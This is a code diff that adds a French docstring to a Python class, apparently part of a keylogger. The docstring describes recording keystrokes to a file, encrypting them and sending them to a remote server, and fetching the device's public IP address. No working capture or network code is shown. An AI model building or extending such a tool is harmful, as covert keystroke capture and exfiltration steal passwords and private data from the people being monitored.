@@ -8,6 +8,22 @@ from cryptography.fernet import Fernet
 import os
 
 class Fichier:
+    """
+    Cette classe fournit des fonctionnalités pour enregistrer les frappes clavier,
+    chiffrer les données et les envoyer au serveur.
+
+    Attributes:
+    - majuscule_active (bool): Indique si la touche de verrouillage majuscule est active.
+    - nom_fichier (str): Le chemin du fichier où les frappes clavier sont enregistrées.
+
+    Methods:
+    - get_ip(): Récupère l'adresse IP publique de l'appareil.
+    - get_keyboard(e): Enregistre les frappes clavier dans un fichier texte.
+    - encrypt_and_send_file(): Chiffre le contenu du fichier et l'envoie au serveur.
+    - send_encrypted_file(key, encrypted_text, server_address, server_port): Envoie un fichier chiffré au serveur.
+    - start_keyboard(): Initialise l'enregistrement des frappes clavier et définit un raccourci clavier pour arrêter le programme.
+    - stop_program(): Arrête le programme en cours d'exécution.
+    """
 
     def __init__(self):
         self.majuscule_active = False
